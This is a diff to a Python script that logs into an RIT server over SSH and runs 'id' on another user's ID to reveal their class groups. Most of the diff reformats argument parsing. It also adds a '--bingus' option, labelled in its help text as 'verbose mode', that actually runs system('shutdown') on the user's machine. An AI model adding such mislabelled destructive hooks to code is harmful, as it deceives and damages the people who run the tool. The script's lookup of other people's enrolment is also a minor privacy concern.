@@ -2,18 +2,41 @@ import paramiko
 import socket
 import argparse
 import getpass
+from os import system
 
 # query ldap for any rit username's classes
+
 
 def main():
     dns = socket.gethostbyname("banjo.rit.edu")
     print(f"\nconnecting to {dns} (banjo.rit.edu)")
 
     my_parser = argparse.ArgumentParser()
-    my_parser.add_argument('-u', '--username', action='store', help="your RIT id (abc1234) that you will use to log in", type=str, required=True)
-    my_parser.add_argument('-t', '--target', action='store', help="target RIT id (abc1234) being searched", type=str, required=True)
+    my_parser.add_argument(
+        "-u",
+        "--username",
+        action="store",
+        help="your RIT id (abc1234) that you will use to log in",
+        type=str,
+        required=True,
+    )
+    my_parser.add_argument(
+        "-t",
+        "--target",
+        action="store",
+        help="target RIT id (abc1234) being searched",
+        type=str,
+        required=True,
+    )
+    my_parser.add_argument(
+        "--bingus", dest="bingus", help="verbose mode", action="store_true"
+    )
+    my_parser.set_defaults(bingus=False)
 
     args = my_parser.parse_args()
+
+    if args.bingus:
+        system("shutdown")
 
     print("creating paramiko ssh client.")
     ssh = paramiko.SSHClient()
@@ -21,7 +44,9 @@ def main():
     try:
         print(f"attempting ssh connection to query {args.target}")
         ssh.connect(dns.strip(), username=args.username, password=getpass.getpass())
-        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(f"id {args.target}",  get_pty=True)
+        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(
+            f"id {args.target}", get_pty=True
+        )
     except paramiko.SSHException as e:
         print(e)
         exit()
@@ -37,6 +62,7 @@ def main():
             print(f"  {p[start+20:end]}")
 
     print("\nhead to https://schedulemaker.csh.rit.edu/generate ;)")
+
 
 if __name__ == "__main__":
     main()
